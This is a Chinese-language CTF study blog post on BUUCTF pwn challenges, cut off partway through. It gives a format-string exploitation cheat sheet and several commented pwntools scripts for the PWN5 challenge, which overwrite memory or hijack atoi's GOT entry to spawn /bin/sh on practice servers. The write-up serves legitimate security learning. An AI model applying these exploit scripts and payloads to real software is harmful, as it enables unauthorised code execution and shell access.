<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"xiaoxiaoxy1.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
<meta name="description" content="做题笔记">
<meta property="og:type" content="article">
<meta property="og:title" content="BUUctf">
<meta property="og:url" content="http://xiaoxiaoxy1.github.io/2022/09/15/BUUctf/index.html">
<meta property="og:site_name" content="xiaoxiaoxy">
<meta property="og:description" content="做题笔记">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/09/15/BUUctf/image-20220915153634079.png">
<meta property="article:published_time" content="2022-09-15T02:40:15.000Z">
<meta property="article:modified_time" content="2022-09-22T14:59:36.846Z">
<meta property="article:author" content="xiaoxiaoxy">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://xiaoxiaoxy1.github.io/2022/09/15/BUUctf/image-20220915153634079.png">


<link rel="canonical" href="http://xiaoxiaoxy1.github.io/2022/09/15/BUUctf/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://xiaoxiaoxy1.github.io/2022/09/15/BUUctf/","path":"2022/09/15/BUUctf/","title":"BUUctf"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>BUUctf | xiaoxiaoxy</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="xiaoxiaoxy" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">xiaoxiaoxy</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn"><span class="nav-number">1.</span> <span class="nav-text"> pwn </span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.1.</span> <span class="nav-text"> 格式化字符串漏洞 </span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5"><span class="nav-number">1.1.1.</span> <span class="nav-text"> [第五空间2019 决赛]PWN5 </span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%87%8D%E7%82%B9%E7%AC%94%E8%AE%B0"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">重点笔记</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88"><span class="nav-number">1.2.</span> <span class="nav-text"> 栈 </span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ciscn-2019-c-1"><span class="nav-number">1.2.1.</span> <span class="nav-text"> ciscn_2019_c_1 </span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%98%E5%9E%8B%EF%BC%9Aret2libc"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">题型：ret2libc</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get-started-3dsctf-2016"><span class="nav-number">1.2.2.</span> <span class="nav-text"> get_started_3dsctf_2016 </span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="xiaoxiaoxy"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">xiaoxiaoxy</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">28</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="http://xiaoxiaoxy1.github.io/2022/09/15/BUUctf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="xiaoxiaoxy">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="xiaoxiaoxy">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          BUUctf
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-09-15 10:40:15" itemprop="dateCreated datePublished" datetime="2022-09-15T10:40:15+08:00">2022-09-15</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2022-09-22 22:59:36" itemprop="dateModified" datetime="2022-09-22T22:59:36+08:00">2022-09-22</time>
      </span>

  
</div>

            <div class="post-description">做题笔记</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">一级标题：<span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span>&gt;</span> pwn <span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">二级标题：<span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;green&quot;</span>&gt;</span> 格式化字符串漏洞 <span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">三级标题：<span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;orange&quot;</span>&gt;</span> [第五空间2019 决赛]PWN5 <span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"></span><br><span class="line">4空格缩进：<span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span></span><br><span class="line">8空格缩进：<span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span></span><br></pre></td></tr></table></figure>





<h1 id="pwn"><a href="#pwn" class="headerlink" title=" pwn "></a><center><font color="red"> pwn </font></center></h1><h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title=" 格式化字符串漏洞 "></a><center><font color="green"> 格式化字符串漏洞 </font></center></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">栈数据读：</span><br><span class="line">  AAAA %08x %08x %08x %08x %08x %08x %08x %08x</span><br><span class="line">  AAAA_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x</span><br><span class="line">  AAAA %p %p %p %p %p %p %p %p</span><br><span class="line">  AAAA_%p_%p_%p_%p_%p_%p_%p_%p</span><br><span class="line">    </span><br><span class="line">泄露任意地址：</span><br><span class="line">  addr%k$s   k偏移、addr地址</span><br><span class="line">    </span><br><span class="line">任意地址写：</span><br><span class="line">  [addr of c]%012d%6$n    </span><br><span class="line">  addr of c 的长度为4,故而我们得再输入12个字符才可以达到16个字符,以便于来修改c的值为16。</span><br><span class="line">  </span><br><span class="line">  payload=p32(0x804c044)+p32(0x804c045)+p32(0x804c046)+p32(0x804c047)</span><br><span class="line">  payload+=&#x27;%10$n%11$n%12$n%13$n&#x27;</span><br><span class="line"> </span><br><span class="line">  %lln :8字节</span><br><span class="line">  %n   :4字节</span><br><span class="line">  %hn  :2字节</span><br><span class="line">  %hhn :1字节</span><br><span class="line">  </span><br><span class="line">  </span><br></pre></td></tr></table></figure>







<h3 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title=" [第五空间2019 决赛]PWN5 "></a><center><font color="orange"> [第五空间2019 决赛]PWN5 </font></center></h3><p>题目链接：[BUUCTF在线评测 (buuoj.cn)](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019">https://buuoj.cn/challenges#[第五空间2019</a> 决赛]PWN5)</p>
<p>参考链接1：[<a target="_blank" rel="noopener" href="https://blog.csdn.net/BangSen1/article/details/115191602">BUUCTF]PWN——[第五空间2019 决赛]PWN5_HAIANAWEI的博客-CSDN博客</a></p>
<p>参考链接2：[buuctf——<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41560595/article/details/114916869">第五空间2019 决赛]PWN5 1_云啾啾啾的博客-CSDN博客</a></p>
<p>参考链接3：[<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41696518/article/details/125771666?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-125771666-blog-114916869.pc_relevant_multi_platform_whitelistv6&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-125771666-blog-114916869.pc_relevant_multi_platform_whitelistv6&utm_relevant_index=1">第五空间2019 决赛]PWN5 ——两种解法_Mokapeng的博客-CSDN博客_pwn5 第五空间</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">分析&amp;思路1：</span><br><span class="line">    1、源程序大意是把随机数放入到bss段的0x804c044处，用户输入用户名和密码，如果密码和随机数相等，则拿到权限。</span><br><span class="line">    2、程序中存在格式化字符串漏洞，我们可以通过任意写将bss段0x804c044处的密码修改为我们的输入值</span><br><span class="line"></span><br><span class="line">分析&amp;思路2：</span><br><span class="line">    1、通过格式化字符串漏洞带来的任意写权限将aoti()函数地址修改为system()地址，执行system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br></pre></td></tr></table></figure>

<br/>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">参考脚本<span class="number">1</span>：(对应参考链接<span class="number">1</span>)</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26959</span>)</span><br><span class="line"></span><br><span class="line">payload=p32(<span class="number">0x804c044</span>)+p32(<span class="number">0x804c045</span>)+p32(<span class="number">0x804c046</span>)+p32(<span class="number">0x804c047</span>)</span><br><span class="line">payload+=<span class="string">&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">0x10101010</span>))</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line">个人理解：</span><br><span class="line">  <span class="number">1.</span> 先将地址数据<span class="number">0x804c044</span>、<span class="number">0x804c045</span>、<span class="number">0x804c046</span>、<span class="number">0x804c047</span>排部到栈上</span><br><span class="line">  <span class="number">2.</span> 偏移值为<span class="number">10</span>(此处偏移值是指程序输入name时，通过AAAA %08x %08x ... %08x这串字符，看看第几个%08x能打印出AAAA的值<span class="number">0x41414141</span>，也就是printf向栈上写入数据的栈地址，测试发现第十个%08x能打印出<span class="number">0x41414141</span>所以偏移值为<span class="number">10</span>)</span><br><span class="line">  <span class="number">3.</span> 又因为p32(<span class="number">0x804c044</span>)+p32(<span class="number">0x804c045</span>)+p32(<span class="number">0x804c046</span>)+p32(<span class="number">0x804c047</span>)这串字符长度为<span class="number">16</span>字节，每个地址<span class="number">4</span>字节，所以通过%n向目标地址写入的数据为<span class="number">0x10</span></span><br><span class="line">  <span class="number">4.</span> %<span class="number">10</span>$n的意思是向偏移值<span class="number">10</span>的栈上存储的地址处写入数据<span class="number">0x10</span>，偏移<span class="number">10</span>的地址为<span class="number">0x804c044</span></span><br><span class="line">     %<span class="number">13</span>$n的意思是向偏移值<span class="number">13</span>的栈上存储的地址处写入数据<span class="number">0x10</span>，偏移<span class="number">13</span>的地址为<span class="number">0x804c047</span></span><br></pre></td></tr></table></figure>

<br/>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">参考脚本<span class="number">2</span>：(对应参考链接<span class="number">2</span>)</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28630</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./pwn5&quot;)</span></span><br><span class="line">bss=<span class="number">0x0804c044</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload=<span class="string">b&quot;AAAA%16$n%17$n%18$n%19$n&quot;</span>+p32(bss)+p32(bss+<span class="number">1</span>)+p32(bss+<span class="number">2</span>)+p32(bss+<span class="number">3</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x04040404</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">个人理解：</span><br><span class="line">    <span class="number">1</span>、与参考脚本<span class="number">1</span>类似，只是把栈上数据布置改了一下，思路是一样的</span><br><span class="line">    <span class="number">2</span>、AAAA四个字符在%n前面，所以%n会将<span class="number">0x04</span>写入目标地址</span><br><span class="line">    <span class="number">3</span>、通过%<span class="number">16</span>$、%<span class="number">17</span>$等来表示要写入地址的偏移值</span><br></pre></td></tr></table></figure>

<p><img src="image-20220915153634079.png" alt="image-20220915153634079"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">参考脚本<span class="number">3</span>：(对应参考链接<span class="number">3</span>)</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25068</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;atoi_got:system_plt&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">作者思路：</span><br><span class="line">  我们可以利用fmtstr_payload修改任意内容，</span><br><span class="line">  fmtstr_payload是pwntools里面的一个工具，可以实现修改任意内存，用来简化对格式化字符串漏洞的构造工作。</span><br><span class="line">    </span><br><span class="line">fmtstr_payload(offset, &#123;printf_got: system_addr&#125;)(偏移，&#123;原地址：目的地址&#125;)</span><br><span class="line">  <span class="number">1</span>、fmtstr_payload(offset, writes, numbwritten=<span class="number">0</span>, write_size=‘byte’)</span><br><span class="line">  <span class="number">2</span>、第一个参数表示格式化字符串的偏移；</span><br><span class="line">  <span class="number">3</span>、第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成&#123;printfGOT:systemAddress&#125;；本题是将0804a048处改为<span class="number">0x2223322</span>   </span><br><span class="line">  <span class="number">4</span>、第三个参数表示已经输出的字符个数，这里没有，为<span class="number">0</span>，采用默认值即可；</span><br><span class="line">  <span class="number">5</span>、第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（<span class="built_in">int</span>），对应着hhn、hn和n，默认值是byte，即按hhn写。</span><br><span class="line">  <span class="number">6</span>、fmtstr_payload函数返回的就是payload</span><br><span class="line"></span><br><span class="line">思路：利用字符串漏洞将判断的atoi直接替换成system，然后手动输入<span class="string">&quot;/bin/sh&quot;</span>字符串，即可达成system(“/<span class="built_in">bin</span>/sh”)目的</span><br></pre></td></tr></table></figure>

<br/>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">个人脚本<span class="number">1</span>：(分析&amp;思路<span class="number">1</span>)</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25476</span>)</span><br><span class="line"></span><br><span class="line">payload =  <span class="string">b&#x27;AAAAaaaa&#x27;</span>        <span class="comment">#偏移10、11</span></span><br><span class="line">payload += p32(<span class="number">0x0804c044</span>)    <span class="comment">#偏移12</span></span><br><span class="line">payload += p32(<span class="number">0x0804c045</span>)    <span class="comment">#偏移13</span></span><br><span class="line">payload += p32(<span class="number">0x0804c046</span>)    <span class="comment">#偏移14</span></span><br><span class="line">payload += p32(<span class="number">0x0804c047</span>)    <span class="comment">#偏移15</span></span><br><span class="line">payload += <span class="string">b&#x27;%12$n%13$n%14$n%15$n&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">0x18181818</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>%n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</p>
<br/>

<h4 id="重点笔记"><a href="#重点笔记" class="headerlink" title="重点笔记"></a>重点笔记</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">个人脚本<span class="number">2</span>：(分析&amp;思路<span class="number">2</span>)</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn5&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,28333)</span></span><br><span class="line"></span><br><span class="line">atoi   = <span class="number">0x0804c034</span>    <span class="comment"># readelf -a pwn5</span></span><br><span class="line">system = <span class="number">0x08049080</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pad1 = 8*b&#x27;a&#x27;</span></span><br><span class="line"><span class="string">pad2 = 4*b&#x27;a&#x27;</span></span><br><span class="line"><span class="string">pad3 = 144*b&#x27;a&#x27;</span></span><br><span class="line"><span class="string">pad4 = 112*b&#x27;a&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload  = p32(0x0804c034)</span></span><br><span class="line"><span class="string">payload += p32(0x0804c035)</span></span><br><span class="line"><span class="string">payload += p32(0x0804c036)</span></span><br><span class="line"><span class="string">payload += p32(0x0804c037)</span></span><br><span class="line"><span class="string">payload += b&#x27;%8c&#x27;+b&#x27;%10$hhn&#x27;</span></span><br><span class="line"><span class="string">payload += b&#x27;%4c&#x27;+b&#x27;%11$hhn&#x27;</span></span><br><span class="line"><span class="string">payload += b&#x27;%144c&#x27;+b&#x27;%12$hhn&#x27;</span></span><br><span class="line"><span class="string">payload += b&#x27;%128c&#x27;+b&#x27;%13$hhn&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x804c034</span>)</span><br><span class="line">payload += p32(<span class="number">0x804c035</span>)</span><br><span class="line">payload += p32(<span class="number">0x804c036</span>)</span><br><span class="line">payload += p32(<span class="number">0x804c037</span>)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">b&#x27;%112c&#x27;</span> + <span class="string">b&#x27;%10$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%16c&#x27;</span> + <span class="string">b&#x27;%11$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%116c&#x27;</span> + <span class="string">b&#x27;%12$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%4c&#x27;</span> + <span class="string">b&#x27;%13$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">elf = ELF(&#x27;./pwn5&#x27;)</span></span><br><span class="line"><span class="string">atoi_got = elf.got[&#x27;atoi&#x27;]</span></span><br><span class="line"><span class="string">system_plt = elf.plt[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">payload=fmtstr_payload(10,&#123;atoi_got:system_plt&#125;)</span></span><br><span class="line"><span class="string">io.sendline(payload)</span></span><br><span class="line"><span class="string">io.sendline(b&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line"><span class="string">io.interactive()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注释部分是自己想的payload，打不通，</span></span><br><span class="line"><span class="comment">#参考fmtstr_payload()的源代码后重新写了个payload，打通了</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#第一个 %112c 的由来：我们要向atoi = 0x0804c034地址写入system = 0x08049080</span></span><br><span class="line"><span class="comment">#首先写末尾一字节0x80 = 128，四个p32(0x...)占了16(4个4byte)字节，所以(128-16)%0xFF = 112</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#第二个 %16c 的由来：</span></span><br><span class="line"><span class="comment">#其次我们要写倒数第二个字节0x90，前面输出了16+112=0x80个字节，我们只需再输出0x10=16个字节就行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#第三个 %116c 的由来：</span></span><br><span class="line"><span class="comment">#再者我们要写入第二个字节0x04，前面输出了0x90个字节，要输出0x04只能溢出，</span></span><br><span class="line">   <span class="comment">#而(0x90+0x74)%0xFF=0x04,0x74=116,所以第三个为%116C，输出116个空格</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#第四个 %4c 的由来：</span></span><br><span class="line"><span class="comment">#最后我们要写入第一个字节0x08，同理，第三步后，通过溢出相当于之前只输出过4个字节</span></span><br><span class="line">   